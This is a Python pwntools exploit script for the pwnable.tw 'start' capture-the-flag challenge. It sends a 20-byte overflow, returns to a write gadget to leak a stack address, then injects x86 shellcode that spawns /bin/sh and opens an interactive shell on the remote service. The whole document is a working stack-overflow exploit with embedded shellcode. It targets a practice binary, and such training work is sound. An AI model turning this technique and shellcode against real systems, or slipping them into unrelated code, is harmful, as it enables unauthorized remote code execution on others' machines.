from pwn import *

context.log_level = 'debug'
context.arch='i386'

LOCAL = False

if LOCAL:
	p = process('./start')
else:
	p = remote('chall.pwnable.tw',10000)



def main():
	rop_write = 0x08048087
	shellcode = "\x68\x2f\x73\x68\xff\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x31\xc0\x88\x43\x07\x50\x53\x89\xe1\x8d\x51\x04\x83\xc0\x0e\x48\x48\x48\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xc6\x04\x24\xd2\xc3"
	
	payload = '\x41' * 20
	payload += p32(rop_write)
	p.recvuntil('Let\'s start the CTF:')
	p.send(payload)
	shellcode_stack_addr = u32(p.recv(4))+0x14
	print "Stack add at :" + str(hex(shellcode_stack_addr))
	payload = '\x41'*20 + p32(shellcode_stack_addr)+shellcode
	p.send(payload)
	p.interactive()

if __name__ == '__main__':
	main()
